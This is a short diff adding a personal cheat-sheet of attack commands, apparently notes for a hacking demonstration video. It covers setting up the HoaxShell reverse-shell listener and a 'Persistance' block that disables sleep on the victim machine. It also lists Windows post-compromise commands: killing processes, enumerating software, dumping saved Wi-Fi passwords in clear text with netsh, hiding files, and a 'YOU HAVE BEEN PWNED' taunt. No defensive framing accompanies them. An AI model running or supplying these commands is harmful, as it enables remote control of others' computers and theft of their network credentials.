@@ -1,0 +1,68 @@
+commands
+
+QFlipper
+download qflipper 
+https://flipperzero.one/update
+chmod a+x qFlipper.AppImage
+sudo ./qFlipper.AppImage
+
+
+
+HoaxShell
+git clone https://github.com/t3l3machus/hoaxshell
+cd ./hoaxshell
+sudo pip3 install -r requirements.txt
+chmod +x hoaxshell.py
+cd hoaxshell/revshells
+sudo python3 hoaxshell-listener.py -t cmd-curl -p 80
+
+
+KILLS FROZEN/ NONRESPONSIVE SHELL LISTENER
+sudo fuser -k 80/tcp
+
+
+
+Persistance
+powercfg /change standby-timeout-ac 0
+powercfg /change standby-timeout-dc 0
+powercfg /change monitor-timeout-ac 0
+powercfg /change monitor-timeout-dc 0
+powercfg /change hibernate-timeout-ac 0
+powercfg /change hibernate-timeout-dc 0
+
+
+windows commands
+
+
+Start https://www.youtube.com/watch?v=uHgt8giw1LY
+start /max iexplore.exe https://www.youtube.com/watch?v=uHgt8giw1LY
+explorer "https://www.youtube.com/watch?v=uHgt8giw1LY"
+start chrome https://www.youtube.com/watch?v=uHgt8giw1LY
+
+title YOU HAVE BEEN PWNED
+systeminformation
+
+tasklist
+taskkill /f /pid 00000
+
+netsh wlan show profile
+netsh wlan show profile Hnet_5G key=clear
+
+attrib +h +s +r Desktop/hacker.jpg
+attrib -h -s -r Desktop/hacker.jpg
+
+mkdir "Desktop/HACKED"
+copy "path_to_file . extension" "path_to_copy_file_to/filename . extension"
+copy "folder_name" "path_to_copy_folder_to"
+erase "path_to_file . extension"
+rmdir "Desktop/HACKED"
+
+
+wmic product get name
+
+curl.exe --output Desktop/hacker.jpg --url https://img.freepik.com/premium-photo/hacker-desktop-wallpaper-cyber-background_910608-3038.jpg?w=826
+
+scp Will save for another video
+
+
+
